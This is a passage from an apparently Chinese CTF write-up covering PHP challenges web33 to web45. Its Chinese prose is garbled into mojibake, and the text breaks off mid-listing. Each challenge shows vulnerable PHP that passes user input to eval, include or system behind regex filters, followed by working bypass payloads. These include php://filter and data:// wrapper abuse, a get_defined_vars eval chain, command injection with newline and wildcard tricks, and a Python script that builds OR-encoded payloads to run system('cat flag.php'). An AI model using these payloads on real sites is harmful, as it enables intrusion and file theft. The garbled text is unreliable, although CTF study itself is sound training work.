å‚</td></tr><tr><td>php://output</td><td>åªå†™çš„æ•°æ®æµï¼Œå…è®¸ä»¥ print å’Œ echo ä¸€æ ·çš„æ–¹å¼å†™å…¥åˆ°è¾“å‡ºç¼“å†²åŒºã€‚</td></tr><tr><td>php://fd</td><td>(&gt;=5.3.6)å…è®¸ç›´æ¥è®¿é—®æŒ‡å®šçš„æ–‡ä»¶æè¿°ç¬¦ã€‚ä¾‹å¦‚ <code>php://fd/3</code> å¼•ç”¨äº†æ–‡ä»¶æè¿°ç¬¦ 3ã€‚</td></tr><tr><td>php://memory php://temp</td><td>(&gt;=5.1.0)ä¸€ä¸ªç±»ä¼¼æ–‡ä»¶åŒ…è£…å™¨çš„æ•°æ®æµï¼Œå…è®¸è¯»å†™ä¸´æ—¶æ•°æ®ã€‚ä¸¤è€…çš„å”¯ä¸€åŒºåˆ«æ˜¯ <code>php://memory</code> æ€»æ˜¯æŠŠæ•°æ®å‚¨å­˜åœ¨å†…å­˜ä¸­ï¼Œè€Œ <code>php://temp</code> ä¼šåœ¨å†…å­˜é‡è¾¾åˆ°é¢„å®šä¹‰çš„é™åˆ¶åï¼ˆé»˜è®¤æ˜¯ <code>2MB</code>ï¼‰å­˜å…¥ä¸´æ—¶æ–‡ä»¶ä¸­ã€‚ä¸´æ—¶æ–‡ä»¶ä½ç½®çš„å†³å®šå’Œ <code>sys_get_temp_dir()</code> çš„æ–¹å¼ä¸€è‡´ã€‚</td></tr><tr><td>php://filter</td><td>(&gt;=5.0.0)ä¸€ç§å…ƒå°è£…å™¨ï¼Œè®¾è®¡ç”¨äºæ•°æ®æµæ‰“å¼€æ—¶çš„ç­›é€‰è¿‡æ»¤åº”ç”¨ã€‚å¯¹äºä¸€ä½“å¼<code>ï¼ˆall-in-oneï¼‰</code>çš„æ–‡ä»¶å‡½æ•°éå¸¸æœ‰ç”¨ï¼Œç±»ä¼¼ <code>readfile()</code>ã€<code>file()</code> å’Œ <code>file_get_contents()</code>ï¼Œåœ¨æ•°æ®æµå†…å®¹è¯»å–ä¹‹å‰æ²¡æœ‰æœºä¼šåº”ç”¨å…¶ä»–è¿‡æ»¤å™¨ã€‚</td></tr></tbody></table><p><strong><code>php://filter</code>å‚æ•°è¯¦è§£</strong></p><p>è¯¥åè®®çš„å‚æ•°ä¼šåœ¨è¯¥åè®®è·¯å¾„ä¸Šè¿›è¡Œä¼ é€’ï¼Œå¤šä¸ªå‚æ•°éƒ½å¯ä»¥åœ¨ä¸€ä¸ªè·¯å¾„ä¸Šä¼ é€’ã€‚å…·ä½“å‚è€ƒå¦‚ä¸‹ï¼š</p><table><thead><tr><th>php://filter å‚æ•°</th><th>æè¿°</th><th></th></tr></thead><tbody><tr><td>resource=&lt;è¦è¿‡æ»¤çš„æ•°æ®æµ&gt;</td><td>å¿…é¡»é¡¹ã€‚å®ƒæŒ‡å®šäº†ä½ è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµã€‚</td><td></td></tr><tr><td>read=&lt;è¯»é“¾çš„è¿‡æ»¤å™¨&gt;</td><td>å¯é€‰é¡¹ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ*\</td><td>*ï¼‰åˆ†éš”ã€‚</td></tr><tr><td>write=&lt;å†™é“¾çš„è¿‡æ»¤å™¨&gt;</td><td>å¯é€‰é¡¹ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ\</td><td>ï¼‰åˆ†éš”ã€‚</td></tr><tr><td>&lt;; ä¸¤ä¸ªé“¾çš„è¿‡æ»¤å™¨&gt;</td><td>ä»»ä½•æ²¡æœ‰ä»¥ <em>read=</em> æˆ– <em>write=</em> ä½œå‰ç¼€çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºè¯»æˆ–å†™é“¾ã€‚</td><td></td></tr></tbody></table><p><strong>å¯ç”¨çš„è¿‡æ»¤å™¨åˆ—è¡¨ï¼ˆ4ç±»ï¼‰</strong></p><p>æ­¤å¤„åˆ—ä¸¾ä¸»è¦çš„è¿‡æ»¤å™¨ç±»å‹ï¼Œè¯¦ç»†å†…å®¹è¯·å‚è€ƒï¼š<a href="https://link.segmentfault.com/?enc=TvNqxQJsmPli714fAg4qxA==.jfUSJBdJsmST/7kefiWpUGR3c09fXjXvpga5K0ExDmpAxVkhIcaZZ7Oag21SmAlO">https://www.php.net/manual/zh/filters.php</a></p><table><thead><tr><th>å­—ç¬¦ä¸²è¿‡æ»¤å™¨</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>string.rot13</td><td>ç­‰åŒäº<code>str_rot13()</code>ï¼Œrot13å˜æ¢</td></tr><tr><td>string.toupper</td><td>ç­‰åŒäº<code>strtoupper()</code>ï¼Œè½¬å¤§å†™å­—æ¯</td></tr><tr><td>string.tolower</td><td>ç­‰åŒäº<code>strtolower()</code>ï¼Œè½¬å°å†™å­—æ¯</td></tr><tr><td>string.strip_tags</td><td>ç­‰åŒäº<code>strip_tags()</code>ï¼Œå»é™¤htmlã€PHPè¯­è¨€æ ‡ç­¾</td></tr></tbody></table><table><thead><tr><th>è½¬æ¢è¿‡æ»¤å™¨</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>convert.base64-encode &amp; convert.base64-decode</td><td>ç­‰åŒäº<code>base64_encode()</code>å’Œ<code>base64_decode()</code>ï¼Œbase64ç¼–ç è§£ç </td></tr><tr><td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td><td>quoted-printable å­—ç¬¦ä¸²ä¸ 8-bit å­—ç¬¦ä¸²ç¼–ç è§£ç </td></tr></tbody></table><table><thead><tr><th>å‹ç¼©è¿‡æ»¤å™¨</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>zlib.deflate &amp; zlib.inflate</td><td>åœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­åˆ›å»º gzip å…¼å®¹æ–‡ä»¶çš„æ–¹æ³•ï¼Œä½†ä¸äº§ç”Ÿå‘½ä»¤è¡Œå·¥å…·å¦‚ gzipçš„å¤´å’Œå°¾ä¿¡æ¯ã€‚åªæ˜¯å‹ç¼©å’Œè§£å‹æ•°æ®æµä¸­çš„æœ‰æ•ˆè½½è·éƒ¨åˆ†ã€‚</td></tr><tr><td>bzip2.compress &amp; bzip2.decompress</td><td>åŒä¸Šï¼Œåœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­åˆ›å»º bz2 å…¼å®¹æ–‡ä»¶çš„æ–¹æ³•ã€‚</td></tr></tbody></table><table><thead><tr><th>åŠ å¯†è¿‡æ»¤å™¨</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>mcrypt.*</td><td>libmcrypt å¯¹ç§°åŠ å¯†ç®—æ³•</td></tr><tr><td>mdecrypt.*</td><td>libmcrypt å¯¹ç§°è§£å¯†ç®—æ³•</td></tr></tbody></table><p>å®ä¾‹ï¼š</p><p><code>php://filter/read=convert.base64-encode/resource=[æ–‡ä»¶å]</code>è¯»å–æ–‡ä»¶æºç ï¼ˆé’ˆå¯¹phpæ–‡ä»¶éœ€è¦base64ç¼–ç ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</span><br></pre></td></tr></table></figure><p><code>php://input + [POST DATA]</code>æ‰§è¡Œphpä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/include.php?file=php://input</span></span><br><span class="line">[POST DATAéƒ¨åˆ†](ä¸è¦ç”¨hackbarä¼ å‚)</span><br><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åªæ¯”ä¸Šé¢˜å¤šè¿‡æ»¤äº†â€æ‰€ä»¥æ–¹æ³•ä¸å˜</p><h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒä¸Š</p><h2 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†&lt;å’Œ=</p><p>æ²¡å•¥åŒºåˆ«åŒä¸Š</p><h2 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºè¿‡äº†æ•°å­—æ‰€ä»¥éœ€è¦æ”¹ä¸€ä¸‹expï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span><span class="variable">$_GET</span>[a]?%<span class="number">3</span>E&amp;a=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h2><p>ä¼ªåè®®çš„åˆ©ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag in flag.php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;</span><br><span class="line">        include($c);</span><br><span class="line">        echo $flag;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºä¸æ˜¯evalæ‰€ä»¥ä¸Šè¿°æ–¹æ³•ä¸è¡Œäº†ï¼Œä½†å¯ä»¥ä½¿ç”¨data://åè®®</p><p>å½“ç„¶php://input ä¹Ÿå¯</p><p>expï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=data://text/plain,&lt;?php cat fl*g.php ?&gt;</span><br></pre></td></tr></table></figure><h3 id="data-åè®®"><a href="#data-åè®®" class="headerlink" title="data:// åè®®"></a><code>data://</code> åè®®</h3><ul><li><p><strong>æ¡ä»¶</strong>ï¼š</p><ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul></li><li><p><strong>ä½œç”¨</strong>ï¼šè‡ª<code>PHP&gt;=5.2.0</code>èµ·ï¼Œå¯ä»¥ä½¿ç”¨<code>data://</code>æ•°æ®æµå°è£…å™¨ï¼Œä»¥ä¼ é€’ç›¸åº”æ ¼å¼çš„æ•°æ®ã€‚é€šå¸¸å¯ä»¥ç”¨æ¥æ‰§è¡ŒPHPä»£ç ã€‚</p></li><li><p><strong>ç”¨æ³•</strong>ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data:<span class="regexp">//</span>text/plain,</span><br><span class="line">data:<span class="regexp">//</span>text/plain;base64,</span><br></pre></td></tr></table></figure></li></ul><h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag in flag.php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|php|file/i&quot;, $c))&#123;</span><br><span class="line">        include($c);</span><br><span class="line">        echo $flag;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag in flag.php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;</span><br><span class="line">        include($c.&quot;.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯•äº†ä¸€ä¸‹ï¼Œå› ä¸ºä¼ å…¥çš„æ•°æ®phpå·²ç»é—­åˆäº†ï¼Œæ‰€ä»¥åé¢.phpè¢«å½“æˆäº†htmlçš„å†…å®¹åœ¨é¡µé¢ä¸Šæ˜¾ç¤ºäº†ã€‚</p><p><img src="https://img-blog.csdnimg.cn/4c52e7b201c448269cba06fe454f363e.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p>ç›´æ¥ç”¨åŸæ¥çš„æ–¹æ³•ä¸€æ ·å¤„ç†</p><h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><p>è™šæ™ƒæˆ‘ä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\ï¼ˆ|\ï¼‰|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹è§æ‹¬å·è¢«è¿‡æ»¤äº†ï¼Œç»“æœä»”ç»†çœ‹æ˜¯ä¸­æ–‡æ‹¬å·ï¼Œé‚£ä¸web30ç±»ä¼¼ã€‚çœ‹äº†bç«™çœ‹äº†ç¾¤ä¸»çš„å§¿åŠ¿è®°å½•ä¸€ä¸‹</p><p>è·å–åˆ°å€¼</p><p><img src="https://img-blog.csdnimg.cn/0b5e073410cb4a078aa62754a18dc652.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/fcc7c2a705794328a2d815d827c6c0ab.png" alt="img"></p><p>expï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=eval(array_pop(next(get_defined_vars())));</span><br><span class="line">[post data]</span><br><span class="line">a=system(&#x27;cat flag.php&#x27;);</span><br></pre></td></tr></table></figure><h2 id="web41"><a href="#web41" class="headerlink" title="web41(|)"></a>web41(|)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é¢˜çœŸæ»´bt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=</span><br><span class="line"></span><br><span class="line">a=[]</span><br><span class="line">ans1=&quot;&quot;</span><br><span class="line">ans2=&quot;&quot;</span><br><span class="line">for i in range(0,256):</span><br><span class="line">    c=chr(i)</span><br><span class="line">    tmp = re.match(r&#x27;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#x27;,c, re.I)</span><br><span class="line">    if(tmp):</span><br><span class="line">        continue</span><br><span class="line">        #print(tmp.group(0))</span><br><span class="line">    else:</span><br><span class="line">        a.append(i)</span><br><span class="line"></span><br><span class="line"># eval(&quot;echo($c);&quot;);</span><br><span class="line">mya=&quot;system&quot;  #å‡½æ•°å è¿™é‡Œä¿®æ”¹ï¼</span><br><span class="line">myb=&quot;cat flag.php&quot;      #å‚æ•°</span><br><span class="line">def myfun(k,my):</span><br><span class="line">    global ans1</span><br><span class="line">    global ans2</span><br><span class="line">    for i in range (0,len(a)):</span><br><span class="line">        for j in range(i,len(a)):</span><br><span class="line">            if(a[i]|a[j]==ord(my[k])):</span><br><span class="line">                ans1+=chr(a[i])</span><br><span class="line">                ans2+=chr(a[j])</span><br><span class="line">                return;</span><br><span class="line">for k in range(0,len(mya)):</span><br><span class="line">    myfun(k,mya)</span><br><span class="line">data1=&quot;(\&quot;&quot;+ans1+&quot;\&quot;|\&quot;&quot;+ans2+&quot;\&quot;)&quot;</span><br><span class="line">ans1=&quot;&quot;</span><br><span class="line">ans2=&quot;&quot;</span><br><span class="line">for k in range(0,len(myb)):</span><br><span class="line">    myfun(k,myb)</span><br><span class="line">data2=&quot;(\&quot;&quot;+ans1+&quot;\&quot;|\&quot;&quot;+ans2+&quot;\&quot;)&quot;</span><br><span class="line"></span><br><span class="line">data=&#123;&quot;c&quot;:data1+data2&#125;</span><br><span class="line">r=requests.post(url=url,data=data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><h2 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>shellçš„çŸ¥è¯†</p><p><strong>1&gt;/dev/null 2&gt;&amp;1çš„å«ä¹‰</strong> </p><p>&gt; ä»£è¡¨é‡å®šå‘åˆ°å“ªé‡Œï¼Œä¾‹å¦‚ï¼šecho â€œ123â€ &gt; /home/123.txt<br>1 è¡¨ç¤ºstdoutæ ‡å‡†è¾“å‡ºï¼Œç³»ç»Ÿé»˜è®¤å€¼æ˜¯1ï¼Œæ‰€ä»¥â€&gt;/dev/nullâ€ç­‰åŒäºâ€1&gt;/dev/nullâ€<br>2 è¡¨ç¤ºstderræ ‡å‡†é”™è¯¯<br>&amp; è¡¨ç¤ºç­‰åŒäºçš„æ„æ€ï¼Œ2&gt;&amp;1ï¼Œè¡¨ç¤º2çš„è¾“å‡ºé‡å®šå‘ç­‰åŒäº1 </p><p>åŒå†™ç»•è¿‡ expï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag.php;ls</span><br></pre></td></tr></table></figure><h2 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†catå’Œï¼›</p><p>expï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl flag.php%0als</span><br></pre></td></tr></table></figure><h2 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/;|cat|flag/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†flag</p><p>expï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl fl?g.php%0als</span><br></pre></td></tr></table></figure><h2 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 